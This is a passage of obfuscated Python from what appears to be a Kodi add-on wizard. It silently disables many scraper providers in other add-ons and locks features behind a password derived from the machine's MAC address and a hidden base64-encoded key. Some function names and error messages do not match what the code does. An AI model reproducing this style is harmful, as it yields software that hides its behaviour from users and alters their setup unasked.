		OO0OOOOOOO00OOOO0 .setSetting ('magnet_extra','false')#line:1216
		OO0OOOOOOO00OOOO0 .setSetting ('rd_only','false')#line:1217
		OO0OOOOOOO00OOOO0 .setSetting ('ftp','false')#line:1219
		OO0OOOOOOO00OOOO0 .setSetting ('fp','false')#line:1220
		OO0OOOOOOO00OOOO0 .setSetting ('filter_fp','false')#line:1221
		OO0OOOOOOO00OOOO0 .setSetting ('fp_size_en','false')#line:1222
		OO0OOOOOOO00OOOO0 .setSetting ('afdah','false')#line:1223
		OO0OOOOOOO00OOOO0 .setSetting ('ap2s','false')#line:1224
		OO0OOOOOOO00OOOO0 .setSetting ('cin','false')#line:1225
		OO0OOOOOOO00OOOO0 .setSetting ('clv','false')#line:1226
		OO0OOOOOOO00OOOO0 .setSetting ('cmv','false')#line:1227
		OO0OOOOOOO00OOOO0 .setSetting ('dl20','false')#line:1228
		OO0OOOOOOO00OOOO0 .setSetting ('esc','false')#line:1229
		OO0OOOOOOO00OOOO0 .setSetting ('extra','false')#line:1230
		OO0OOOOOOO00OOOO0 .setSetting ('film','false')#line:1231
		OO0OOOOOOO00OOOO0 .setSetting ('fre','false')#line:1232
		OO0OOOOOOO00OOOO0 .setSetting ('fxy','false')#line:1233
		OO0OOOOOOO00OOOO0 .setSetting ('genv','false')#line:1234
		OO0OOOOOOO00OOOO0 .setSetting ('getgo','false')#line:1235
		OO0OOOOOOO00OOOO0 .setSetting ('gold','false')#line:1236
		OO0OOOOOOO00OOOO0 .setSetting ('gona','false')#line:1237
		OO0OOOOOOO00OOOO0 .setSetting ('hdmm','false')#line:1238
		OO0OOOOOOO00OOOO0 .setSetting ('hdt','false')#line:1239
		OO0OOOOOOO00OOOO0 .setSetting ('icy','false')#line:1240
		OO0OOOOOOO00OOOO0 .setSetting ('ind','false')#line:1241
		OO0OOOOOOO00OOOO0 .setSetting ('iwi','false')#line:1242
		OO0OOOOOOO00OOOO0 .setSetting ('jen_free','false')#line:1243
		OO0OOOOOOO00OOOO0 .setSetting ('kiss','false')#line:1244
		OO0OOOOOOO00OOOO0 .setSetting ('lavin','false')#line:1245
		OO0OOOOOOO00OOOO0 .setSetting ('los','false')#line:1246
		OO0OOOOOOO00OOOO0 .setSetting ('m4u','false')#line:1247
		OO0OOOOOOO00OOOO0 .setSetting ('mesh','false')#line:1248
		OO0OOOOOOO00OOOO0 .setSetting ('mf','false')#line:1249
		OO0OOOOOOO00OOOO0 .setSetting ('mkvc','false')#line:1250
		OO0OOOOOOO00OOOO0 .setSetting ('mjy','false')#line:1251
		OO0OOOOOOO00OOOO0 .setSetting ('hdonline','false')#line:1252
		OO0OOOOOOO00OOOO0 .setSetting ('moviex','false')#line:1253
		OO0OOOOOOO00OOOO0 .setSetting ('mpr','false')#line:1254
		OO0OOOOOOO00OOOO0 .setSetting ('mvg','false')#line:1255
		OO0OOOOOOO00OOOO0 .setSetting ('mvl','false')#line:1256
		OO0OOOOOOO00OOOO0 .setSetting ('mvs','false')#line:1257
		OO0OOOOOOO00OOOO0 .setSetting ('myeg','false')#line:1258
		OO0OOOOOOO00OOOO0 .setSetting ('ninja','false')#line:1259
		OO0OOOOOOO00OOOO0 .setSetting ('odb','false')#line:1260
		OO0OOOOOOO00OOOO0 .setSetting ('ophd','false')#line:1261
		OO0OOOOOOO00OOOO0 .setSetting ('pks','false')#line:1262
		OO0OOOOOOO00OOOO0 .setSetting ('prf','false')#line:1263
		OO0OOOOOOO00OOOO0 .setSetting ('put18','false')#line:1264
		OO0OOOOOOO00OOOO0 .setSetting ('req','false')#line:1265
		OO0OOOOOOO00OOOO0 .setSetting ('rftv','false')#line:1266
		OO0OOOOOOO00OOOO0 .setSetting ('rltv','false')#line:1267
		OO0OOOOOOO00OOOO0 .setSetting ('sc','false')#line:1268
		OO0OOOOOOO00OOOO0 .setSetting ('seehd','false')#line:1269
		OO0OOOOOOO00OOOO0 .setSetting ('showbox','false')#line:1270
		OO0OOOOOOO00OOOO0 .setSetting ('shuid','false')#line:1271
		OO0OOOOOOO00OOOO0 .setSetting ('sil_gh','false')#line:1272
		OO0OOOOOOO00OOOO0 .setSetting ('spv','false')#line:1273
		OO0OOOOOOO00OOOO0 .setSetting ('subs','false')#line:1274
		OO0OOOOOOO00OOOO0 .setSetting ('tvs','false')#line:1275
		OO0OOOOOOO00OOOO0 .setSetting ('tw','false')#line:1276
		OO0OOOOOOO00OOOO0 .setSetting ('upto','false')#line:1277
		OO0OOOOOOO00OOOO0 .setSetting ('vel','false')#line:1278
		OO0OOOOOOO00OOOO0 .setSetting ('vex','false')#line:1279
		OO0OOOOOOO00OOOO0 .setSetting ('vidc','false')#line:1280
		OO0OOOOOOO00OOOO0 .setSetting ('w4hd','false')#line:1281
		OO0OOOOOOO00OOOO0 .setSetting ('wav','false')#line:1282
		OO0OOOOOOO00OOOO0 .setSetting ('wf','false')#line:1283
		OO0OOOOOOO00OOOO0 .setSetting ('wse','false')#line:1284
		OO0OOOOOOO00OOOO0 .setSetting ('wss','false')#line:1285
		OO0OOOOOOO00OOOO0 .setSetting ('wsse','false')#line:1286
		OO0OOOOOOO00OOOO0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1287
		OO0OOOOOOO00OOOO0 .setSetting ('debrid.only','true')#line:1288
		OO0OOOOOOO00OOOO0 .setSetting ('hosts.captcha','false')#line:1289
		OO0OOOOOOO00OOOO0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1290
		OO0OOOOOOO00OOOO0 .setSetting ('provider.123moviehd','false')#line:1291
		OO0OOOOOOO00OOOO0 .setSetting ('provider.300mbdownload','false')#line:1292
		OO0OOOOOOO00OOOO0 .setSetting ('provider.alltube','false')#line:1293
		OO0OOOOOOO00OOOO0 .setSetting ('provider.allucde','false')#line:1294
		OO0OOOOOOO00OOOO0 .setSetting ('provider.animebase','false')#line:1295
		OO0OOOOOOO00OOOO0 .setSetting ('provider.animeloads','false')#line:1296
		OO0OOOOOOO00OOOO0 .setSetting ('provider.animetoon','false')#line:1297
		OO0OOOOOOO00OOOO0 .setSetting ('provider.bnwmovies','false')#line:1298
		OO0OOOOOOO00OOOO0 .setSetting ('provider.boxfilm','false')#line:1299
		OO0OOOOOOO00OOOO0 .setSetting ('provider.bs','false')#line:1300
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cartoonhd','false')#line:1301
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cdahd','false')#line:1302
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cdax','false')#line:1303
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cine','false')#line:1304
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cinenator','false')#line:1305
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cmovieshdbz','false')#line:1306
		OO0OOOOOOO00OOOO0 .setSetting ('provider.coolmoviezone','false')#line:1307
		OO0OOOOOOO00OOOO0 .setSetting ('provider.ddl','false')#line:1308
		OO0OOOOOOO00OOOO0 .setSetting ('provider.deepmovie','false')#line:1309
		OO0OOOOOOO00OOOO0 .setSetting ('provider.ekinomaniak','false')#line:1310
		OO0OOOOOOO00OOOO0 .setSetting ('provider.ekinotv','false')#line:1311
		OO0OOOOOOO00OOOO0 .setSetting ('provider.filiser','false')#line:1312
		OO0OOOOOOO00OOOO0 .setSetting ('provider.filmpalast','false')#line:1313
		OO0OOOOOOO00OOOO0 .setSetting ('provider.filmwebbooster','false')#line:1314
		OO0OOOOOOO00OOOO0 .setSetting ('provider.filmxy','false')#line:1315
		OO0OOOOOOO00OOOO0 .setSetting ('provider.fmovies','false')#line:1316
		OO0OOOOOOO00OOOO0 .setSetting ('provider.foxx','false')#line:1317
		OO0OOOOOOO00OOOO0 .setSetting ('provider.freefmovies','false')#line:1318
		OO0OOOOOOO00OOOO0 .setSetting ('provider.freeputlocker','false')#line:1319
		OO0OOOOOOO00OOOO0 .setSetting ('provider.furk','false')#line:1320
		OO0OOOOOOO00OOOO0 .setSetting ('provider.gamatotv','false')#line:1321
		OO0OOOOOOO00OOOO0 .setSetting ('provider.gogoanime','false')#line:1322
		OO0OOOOOOO00OOOO0 .setSetting ('provider.gowatchseries','false')#line:1323
		OO0OOOOOOO00OOOO0 .setSetting ('provider.hackimdb','false')#line:1324
		OO0OOOOOOO00OOOO0 .setSetting ('provider.hdfilme','false')#line:1325
		OO0OOOOOOO00OOOO0 .setSetting ('provider.hdmto','false')#line:1326
		OO0OOOOOOO00OOOO0 .setSetting ('provider.hdpopcorns','false')#line:1327
		OO0OOOOOOO00OOOO0 .setSetting ('provider.hdstreams','false')#line:1328
		OO0OOOOOOO00OOOO0 .setSetting ('provider.horrorkino','false')#line:1330
		OO0OOOOOOO00OOOO0 .setSetting ('provider.iitv','false')#line:1331
		OO0OOOOOOO00OOOO0 .setSetting ('provider.iload','false')#line:1332
		OO0OOOOOOO00OOOO0 .setSetting ('provider.iwaatch','false')#line:1333
		OO0OOOOOOO00OOOO0 .setSetting ('provider.kinodogs','false')#line:1334
		OO0OOOOOOO00OOOO0 .setSetting ('provider.kinoking','false')#line:1335
		OO0OOOOOOO00OOOO0 .setSetting ('provider.kinow','false')#line:1336
		OO0OOOOOOO00OOOO0 .setSetting ('provider.kinox','false')#line:1337
		OO0OOOOOOO00OOOO0 .setSetting ('provider.lichtspielhaus','false')#line:1338
		OO0OOOOOOO00OOOO0 .setSetting ('provider.liomenoi','false')#line:1339
		OO0OOOOOOO00OOOO0 .setSetting ('provider.magnetdl','false')#line:1342
		OO0OOOOOOO00OOOO0 .setSetting ('provider.megapelistv','false')#line:1343
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movie2k-ac','false')#line:1344
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movie2k-ag','false')#line:1345
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movie2z','false')#line:1346
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movie4k','false')#line:1347
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movie4kis','false')#line:1348
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movieneo','false')#line:1349
		OO0OOOOOOO00OOOO0 .setSetting ('provider.moviesever','false')#line:1350
		OO0OOOOOOO00OOOO0 .setSetting ('provider.movietown','false')#line:1351
		OO0OOOOOOO00OOOO0 .setSetting ('provider.mvrls','false')#line:1353
		OO0OOOOOOO00OOOO0 .setSetting ('provider.netzkino','false')#line:1354
		OO0OOOOOOO00OOOO0 .setSetting ('provider.odb','false')#line:1355
		OO0OOOOOOO00OOOO0 .setSetting ('provider.openkatalog','false')#line:1356
		OO0OOOOOOO00OOOO0 .setSetting ('provider.ororo','false')#line:1357
		OO0OOOOOOO00OOOO0 .setSetting ('provider.paczamy','false')#line:1358
		OO0OOOOOOO00OOOO0 .setSetting ('provider.peliculasdk','false')#line:1359
		OO0OOOOOOO00OOOO0 .setSetting ('provider.pelisplustv','false')#line:1360
		OO0OOOOOOO00OOOO0 .setSetting ('provider.pepecine','false')#line:1361
		OO0OOOOOOO00OOOO0 .setSetting ('provider.primewire','false')#line:1362
		OO0OOOOOOO00OOOO0 .setSetting ('provider.projectfreetv','false')#line:1363
		OO0OOOOOOO00OOOO0 .setSetting ('provider.proxer','false')#line:1364
		OO0OOOOOOO00OOOO0 .setSetting ('provider.pureanime','false')#line:1365
		OO0OOOOOOO00OOOO0 .setSetting ('provider.putlocker','false')#line:1366
		OO0OOOOOOO00OOOO0 .setSetting ('provider.putlockerfree','false')#line:1367
		OO0OOOOOOO00OOOO0 .setSetting ('provider.reddit','false')#line:1368
		OO0OOOOOOO00OOOO0 .setSetting ('provider.cartoonwire','false')#line:1369
		OO0OOOOOOO00OOOO0 .setSetting ('provider.seehd','false')#line:1370
		OO0OOOOOOO00OOOO0 .setSetting ('provider.segos','false')#line:1371
		OO0OOOOOOO00OOOO0 .setSetting ('provider.serienstream','false')#line:1372
		OO0OOOOOOO00OOOO0 .setSetting ('provider.series9','false')#line:1373
		OO0OOOOOOO00OOOO0 .setSetting ('provider.seriesever','false')#line:1374
		OO0OOOOOOO00OOOO0 .setSetting ('provider.seriesonline','false')#line:1375
		OO0OOOOOOO00OOOO0 .setSetting ('provider.seriespapaya','false')#line:1376
		OO0OOOOOOO00OOOO0 .setSetting ('provider.sezonlukdizi','false')#line:1377
		OO0OOOOOOO00OOOO0 .setSetting ('provider.solarmovie','false')#line:1378
		OO0OOOOOOO00OOOO0 .setSetting ('provider.solarmoviez','false')#line:1379
		OO0OOOOOOO00OOOO0 .setSetting ('provider.stream-to','false')#line:1380
		OO0OOOOOOO00OOOO0 .setSetting ('provider.streamdream','false')#line:1381
		OO0OOOOOOO00OOOO0 .setSetting ('provider.streamflix','false')#line:1382
		OO0OOOOOOO00OOOO0 .setSetting ('provider.streamit','false')#line:1383
		OO0OOOOOOO00OOOO0 .setSetting ('provider.swatchseries','false')#line:1384
		OO0OOOOOOO00OOOO0 .setSetting ('provider.szukajkatv','false')#line:1385
		OO0OOOOOOO00OOOO0 .setSetting ('provider.tainiesonline','false')#line:1386
		OO0OOOOOOO00OOOO0 .setSetting ('provider.tainiomania','false')#line:1387
		OO0OOOOOOO00OOOO0 .setSetting ('provider.tata','false')#line:1390
		OO0OOOOOOO00OOOO0 .setSetting ('provider.trt','false')#line:1391
		OO0OOOOOOO00OOOO0 .setSetting ('provider.tvbox','false')#line:1392
		OO0OOOOOOO00OOOO0 .setSetting ('provider.ultrahd','false')#line:1393
		OO0OOOOOOO00OOOO0 .setSetting ('provider.video4k','false')#line:1394
		OO0OOOOOOO00OOOO0 .setSetting ('provider.vidics','false')#line:1395
		OO0OOOOOOO00OOOO0 .setSetting ('provider.view4u','false')#line:1396
		OO0OOOOOOO00OOOO0 .setSetting ('provider.watchseries','false')#line:1397
		OO0OOOOOOO00OOOO0 .setSetting ('provider.xrysoi','false')#line:1398
		OO0OOOOOOO00OOOO0 .setSetting ('provider.library','false')#line:1399
def fixfont ():#line:1402
	O0000O0OO0OO000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1403
	O0000O00000OO0OOO =json .loads (O0000O0OO0OO000O0 );#line:1405
	O00000O00O0OOOOOO =O0000O00000OO0OOO ["result"]["settings"]#line:1406
	O000OOOOO0O00OO00 =[O0O00O00O0000O0OO for O0O00O00O0000O0OO in O00000O00O0OOOOOO if O0O00O00O0000O0OO ["id"]=="audiooutput.audiodevice"][0 ]#line:1408
	OO0000O0OO0O0OO00 =O000OOOOO0O00OO00 ["options"];#line:1409
	OO00OOOO00O00O0O0 =O000OOOOO0O00OO00 ["value"];#line:1410
	OO0O0OO00O0O00OO0 =[O00O00OO00OOO0O00 for (O00O00OO00OOO0O00 ,OOOO000OOOO0OOO00 )in enumerate (OO0000O0OO0O0OO00 )if OOOO000OOOO0OOO00 ["value"]==OO00OOOO00O00O0O0 ][0 ];#line:1412
	O000OOO0OOO00OOOO =(OO0O0OO00O0O00OO0 +1 )%len (OO0000O0OO0O0OO00 )#line:1414
	O000O0O0OOO0OO000 =OO0000O0OO0O0OO00 [O000OOO0OOO00OOOO ]["value"]#line:1416
	OO00OOOOOO0OOO000 =OO0000O0OO0O0OO00 [O000OOO0OOO00OOOO ]["label"]#line:1417
	O000OO0O000O00000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1419
	try :#line:1421
		O0O0O0O00OOOO000O =json .loads (O000OO0O000O00000 );#line:1422
		if O0O0O0O00OOOO000O ["result"]!=True :#line:1424
			raise Exception #line:1425
	except :#line:1426
		sys .stderr .write ("Error switching audio output device")#line:1427
		raise Exception #line:1428
def parseDOM2 (O0OO000O000OO00O0 ,name =u"",attrs ={},ret =False ):#line:1429
	if isinstance (O0OO000O000OO00O0 ,str ):#line:1432
		try :#line:1433
			O0OO000O000OO00O0 =[O0OO000O000OO00O0 .decode ("utf-8")]#line:1434
		except :#line:1435
			O0OO000O000OO00O0 =[O0OO000O000OO00O0 ]#line:1436
	elif isinstance (O0OO000O000OO00O0 ,unicode ):#line:1437
		O0OO000O000OO00O0 =[O0OO000O000OO00O0 ]#line:1438
	elif not isinstance (O0OO000O000OO00O0 ,list ):#line:1439
		return u""#line:1440
	if not name .strip ():#line:1442
		return u""#line:1443
	O0O0OOO000OOO00O0 =[]#line:1445
	for O00O0O0O000OO0O00 in O0OO000O000OO00O0 :#line:1446
		OO0O0O00OO0OOO000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00O0O0O000OO0O00 )#line:1447
		for O0O00O0O0O0O000OO in OO0O0O00OO0OOO000 :#line:1448
			O00O0O0O000OO0O00 =O00O0O0O000OO0O00 .replace (O0O00O0O0O0O000OO ,O0O00O0O0O0O000OO .replace ("\n"," "))#line:1449
		O000000OO00O0000O =[]#line:1451
		for O00OO00O00O0O00O0 in attrs :#line:1452
			OOOO00O0OO00OOO00 =re .compile ('(<'+name +'[^>]*?(?:'+O00OO00O00O0O00O0 +'=[\'"]'+attrs [O00OO00O00O0O00O0 ]+'[\'"].*?>))',re .M |re .S ).findall (O00O0O0O000OO0O00 )#line:1453
			if len (OOOO00O0OO00OOO00 )==0 and attrs [O00OO00O00O0O00O0 ].find (" ")==-1 :#line:1454
				OOOO00O0OO00OOO00 =re .compile ('(<'+name +'[^>]*?(?:'+O00OO00O00O0O00O0 +'='+attrs [O00OO00O00O0O00O0 ]+'.*?>))',re .M |re .S ).findall (O00O0O0O000OO0O00 )#line:1455
			if len (O000000OO00O0000O )==0 :#line:1457
				O000000OO00O0000O =OOOO00O0OO00OOO00 #line:1458
				OOOO00O0OO00OOO00 =[]#line:1459
			else :#line:1460
				O0OO00O0O000O00O0 =range (len (O000000OO00O0000O ))#line:1461
				O0OO00O0O000O00O0 .reverse ()#line:1462
				for O0000O0O000OOO000 in O0OO00O0O000O00O0 :#line:1463
					if not O000000OO00O0000O [O0000O0O000OOO000 ]in OOOO00O0OO00OOO00 :#line:1464
						del (O000000OO00O0000O [O0000O0O000OOO000 ])#line:1465
		if len (O000000OO00O0000O )==0 and attrs =={}:#line:1467
			O000000OO00O0000O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00O0O0O000OO0O00 )#line:1468
			if len (O000000OO00O0000O )==0 :#line:1469
				O000000OO00O0000O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00O0O0O000OO0O00 )#line:1470
		if isinstance (ret ,str ):#line:1472
			OOOO00O0OO00OOO00 =[]#line:1473
			for O0O00O0O0O0O000OO in O000000OO00O0000O :#line:1474
				OO000O0000O0OO000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0O00O0O0O0O000OO )#line:1475
				if len (OO000O0000O0OO000 )==0 :#line:1476
					OO000O0000O0OO000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0O00O0O0O0O000OO )#line:1477
				for OO0O0O0000OOOOO00 in OO000O0000O0OO000 :#line:1478
					O0OOO0OOOOOO00O0O =OO0O0O0000OOOOO00 [0 ]#line:1479
					if O0OOO0OOOOOO00O0O in "'\"":#line:1480
						if OO0O0O0000OOOOO00 .find ('='+O0OOO0OOOOOO00O0O ,OO0O0O0000OOOOO00 .find (O0OOO0OOOOOO00O0O ,1 ))>-1 :#line:1481
							OO0O0O0000OOOOO00 =OO0O0O0000OOOOO00 [:OO0O0O0000OOOOO00 .find ('='+O0OOO0OOOOOO00O0O ,OO0O0O0000OOOOO00 .find (O0OOO0OOOOOO00O0O ,1 ))]#line:1482
						if OO0O0O0000OOOOO00 .rfind (O0OOO0OOOOOO00O0O ,1 )>-1 :#line:1484
							OO0O0O0000OOOOO00 =OO0O0O0000OOOOO00 [1 :OO0O0O0000OOOOO00 .rfind (O0OOO0OOOOOO00O0O )]#line:1485
					else :#line:1486
						if OO0O0O0000OOOOO00 .find (" ")>0 :#line:1487
							OO0O0O0000OOOOO00 =OO0O0O0000OOOOO00 [:OO0O0O0000OOOOO00 .find (" ")]#line:1488
						elif OO0O0O0000OOOOO00 .find ("/")>0 :#line:1489
							OO0O0O0000OOOOO00 =OO0O0O0000OOOOO00 [:OO0O0O0000OOOOO00 .find ("/")]#line:1490
						elif OO0O0O0000OOOOO00 .find (">")>0 :#line:1491
							OO0O0O0000OOOOO00 =OO0O0O0000OOOOO00 [:OO0O0O0000OOOOO00 .find (">")]#line:1492
					OOOO00O0OO00OOO00 .append (OO0O0O0000OOOOO00 .strip ())#line:1494
			O000000OO00O0000O =OOOO00O0OO00OOO00 #line:1495
		else :#line:1496
			OOOO00O0OO00OOO00 =[]#line:1497
			for O0O00O0O0O0O000OO in O000000OO00O0000O :#line:1498
				O0O0O0OO0000OOOOO =u"</"+name #line:1499
				O0OO00O0000OO0O00 =O00O0O0O000OO0O00 .find (O0O00O0O0O0O000OO )#line:1501
				OOOOOOOO0O000OOO0 =O00O0O0O000OO0O00 .find (O0O0O0OO0000OOOOO ,O0OO00O0000OO0O00 )#line:1502
				O00O0O00O00OO000O =O00O0O0O000OO0O00 .find ("<"+name ,O0OO00O0000OO0O00 +1 )#line:1503
				while O00O0O00O00OO000O <OOOOOOOO0O000OOO0 and O00O0O00O00OO000O !=-1 :#line:1505
					O00O0O0O0OO0OO0OO =O00O0O0O000OO0O00 .find (O0O0O0OO0000OOOOO ,OOOOOOOO0O000OOO0 +len (O0O0O0OO0000OOOOO ))#line:1506
					if O00O0O0O0OO0OO0OO !=-1 :#line:1507
						OOOOOOOO0O000OOO0 =O00O0O0O0OO0OO0OO #line:1508
					O00O0O00O00OO000O =O00O0O0O000OO0O00 .find ("<"+name ,O00O0O00O00OO000O +1 )#line:1509
				if O0OO00O0000OO0O00 ==-1 and OOOOOOOO0O000OOO0 ==-1 :#line:1511
					OOO000O0O0OO0OOO0 =u""#line:1512
				elif O0OO00O0000OO0O00 >-1 and OOOOOOOO0O000OOO0 >-1 :#line:1513
					OOO000O0O0OO0OOO0 =O00O0O0O000OO0O00 [O0OO00O0000OO0O00 +len (O0O00O0O0O0O000OO ):OOOOOOOO0O000OOO0 ]#line:1514
				elif OOOOOOOO0O000OOO0 >-1 :#line:1515
					OOO000O0O0OO0OOO0 =O00O0O0O000OO0O00 [:OOOOOOOO0O000OOO0 ]#line:1516
				elif O0OO00O0000OO0O00 >-1 :#line:1517
					OOO000O0O0OO0OOO0 =O00O0O0O000OO0O00 [O0OO00O0000OO0O00 +len (O0O00O0O0O0O000OO ):]#line:1518
				if ret :#line:1520
					O0O0O0OO0000OOOOO =O00O0O0O000OO0O00 [OOOOOOOO0O000OOO0 :O00O0O0O000OO0O00 .find (">",O00O0O0O000OO0O00 .find (O0O0O0OO0000OOOOO ))+1 ]#line:1521
					OOO000O0O0OO0OOO0 =O0O00O0O0O0O000OO +OOO000O0O0OO0OOO0 +O0O0O0OO0000OOOOO #line:1522
				O00O0O0O000OO0O00 =O00O0O0O000OO0O00 [O00O0O0O000OO0O00 .find (OOO000O0O0OO0OOO0 ,O00O0O0O000OO0O00 .find (O0O00O0O0O0O000OO ))+len (OOO000O0O0OO0OOO0 ):]#line:1524
				OOOO00O0OO00OOO00 .append (OOO000O0O0OO0OOO0 )#line:1525
			O000000OO00O0000O =OOOO00O0OO00OOO00 #line:1526
		O0O0OOO000OOO00O0 +=O000000OO00O0000O #line:1527
	return O0O0OOO000OOO00O0 #line:1529
def addItem (O00O0OOOOOO0O0O00 ,O000OOOO000OOO0O0 ,OO000O0OO0OOOOOO0 ,O0OO0OO00OO0000O0 ,O0OO000O0OO000OO0 ,description =None ):#line:1531
	if description ==None :description =''#line:1532
	description ='[COLOR white]'+description +'[/COLOR]'#line:1533
	OO000O0O0OO00OOO0 =sys .argv [0 ]+"?url="+urllib .quote_plus (O000OOOO000OOO0O0 )+"&mode="+str (OO000O0OO0OOOOOO0 )+"&name="+urllib .quote_plus (O00O0OOOOOO0O0O00 )+"&iconimage="+urllib .quote_plus (O0OO0OO00OO0000O0 )+"&fanart="+urllib .quote_plus (O0OO000O0OO000OO0 )#line:1534
	O00O0OOOO00O0OO0O =True #line:1535
	O000OO0O00O0O0O0O =xbmcgui .ListItem (O00O0OOOOOO0O0O00 ,iconImage =O0OO0OO00OO0000O0 ,thumbnailImage =O0OO0OO00OO0000O0 )#line:1536
	O000OO0O00O0O0O0O .setInfo (type ="Video",infoLabels ={"Title":O00O0OOOOOO0O0O00 ,"Plot":description })#line:1537
	O000OO0O00O0O0O0O .setProperty ("fanart_Image",O0OO000O0OO000OO0 )#line:1538
	O000OO0O00O0O0O0O .setProperty ("icon_Image",O0OO0OO00OO0000O0 )#line:1539
	O00O0OOOO00O0OO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO000O0O0OO00OOO0 ,listitem =O000OO0O00O0O0O0O ,isFolder =False )#line:1540
	return O00O0OOOO00O0OO0O #line:1541
def get_params ():#line:1543
		OOO0OOOOOO0OO0O00 =[]#line:1544
		OO0000OOO0OO00O0O =sys .argv [2 ]#line:1545
		if len (OO0000OOO0OO00O0O )>=2 :#line:1546
				O0O0OOO0O0000OOOO =sys .argv [2 ]#line:1547
				OO000000OOO0O0OOO =O0O0OOO0O0000OOOO .replace ('?','')#line:1548
				if (O0O0OOO0O0000OOOO [len (O0O0OOO0O0000OOOO )-1 ]=='/'):#line:1549
						O0O0OOO0O0000OOOO =O0O0OOO0O0000OOOO [0 :len (O0O0OOO0O0000OOOO )-2 ]#line:1550
				O00OOO0OO00O000OO =OO000000OOO0O0OOO .split ('&')#line:1551
				OOO0OOOOOO0OO0O00 ={}#line:1552
				for OOO00O0O0OO00O00O in range (len (O00OOO0OO00O000OO )):#line:1553
						OO00OOO0O0O0OOO0O ={}#line:1554
						OO00OOO0O0O0OOO0O =O00OOO0OO00O000OO [OOO00O0O0OO00O00O ].split ('=')#line:1555
						if (len (OO00OOO0O0O0OOO0O ))==2 :#line:1556
								OOO0OOOOOO0OO0O00 [OO00OOO0O0O0OOO0O [0 ]]=OO00OOO0O0O0OOO0O [1 ]#line:1557
		return OOO0OOOOOO0OO0O00 #line:1559
def decode (OOOO00OOOO00000OO ,OOOOOO0O0OOO0O00O ):#line:1564
    import base64 #line:1565
    OO00OOOOOOO0OOO0O =[]#line:1566
    if (len (OOOO00OOOO00000OO ))!=4 :#line:1568
     return 10 #line:1569
    OOOOOO0O0OOO0O00O =base64 .urlsafe_b64decode (OOOOOO0O0OOO0O00O )#line:1570
    for O00OO00O000OOO00O in range (len (OOOOOO0O0OOO0O00O )):#line:1572
        OOO00O0OOOO00O000 =OOOO00OOOO00000OO [O00OO00O000OOO00O %len (OOOO00OOOO00000OO )]#line:1573
        OOO0OOOO0O00O0OO0 =chr ((256 +ord (OOOOOO0O0OOO0O00O [O00OO00O000OOO00O ])-ord (OOO00O0OOOO00O000 ))%256 )#line:1574
        OO00OOOOOOO0OOO0O .append (OOO0OOOO0O00O0OO0 )#line:1575
    return "".join (OO00OOOOOOO0OOO0O )#line:1576
def tmdb_list (OOOOOOOOO0OOOOO0O ):#line:1577
    OO0OO0000OO0OOOOO =decode ("7643",OOOOOOOOO0OOOOO0O )#line:1580
    return int (OO0OO0000OO0OOOOO )#line:1583
def u_list (OOO000OO00OO00OOO ):#line:1584
    from math import sqrt #line:1586
    OO0000O00000OO0OO =tmdb_list (TMDB_NEW_API )#line:1587
    O0O0OO00OO00OOOOO =str ((getHwAddr ('eth0'))*OO0000O00000OO0OO )#line:1589
    O000O0OOOOOOO0O00 =int (O0O0OO00OO00OOOOO [1 ]+O0O0OO00OO00OOOOO [2 ]+O0O0OO00OO00OOOOO [5 ]+O0O0OO00OO00OOOOO [7 ])#line:1590
    O00O0000OO0O0000O =(ADDON .getSetting ("pass"))#line:1592
    O0O00OO00OOOO000O =(str (round (sqrt ((O000O0OOOOOOO0O00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1597
    if '.'in O0O00OO00OOOO000O :#line:1598
     O0O00OO00OOOO000O =(str (round (sqrt ((O000O0OOOOOOO0O00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1599
    if O00O0000OO0O0000O ==O0O00OO00OOOO000O :#line:1601
      O0OO00O0OOOO00000 =OOO000OO00OO00OOO #line:1603
    else :#line:1605
       if STARTP2 ()and STARTP ()=='ok':#line:1606
         return OOO000OO00OO00OOO #line:1609
       O0OO00O0OOOO00000 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1610
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1611
       sys .exit ()#line:1612
    return O0OO00O0OOOO00000 #line:1613
def disply_hwr ():#line:1615
   try :#line:1616
    OOO0OO000OO000OO0 =tmdb_list (TMDB_NEW_API )#line:1617
    OO0OO0OOOO00O0O00 =str ((getHwAddr ('eth0'))*OOO0OO000OO000OO0 )#line:1618
    O0O00OOO00O0000O0 =(OO0OO0OOOO00O0O00 [1 ]+OO0OO0OOOO00O0O00 [2 ]+OO0OO0OOOO00O0O00 [5 ]+OO0OO0OOOO00O0O00 [7 ])#line:1625
    OO000OOOOOOOO0O0O =(ADDON .getSetting ("action"))#line:1626
    wiz .setS ('action',str (O0O00OOO00O0000O0 ))#line:1628
   except :pass #line:1629
def disply_hwr2 ():#line:1630
   try :#line:1631
    O0000OOO00OOOO00O =tmdb_list (TMDB_NEW_API )#line:1632
    OOOOOOO00OOOO00O0 =str ((getHwAddr ('eth0'))*O0000OOO00OOOO00O )#line:1634
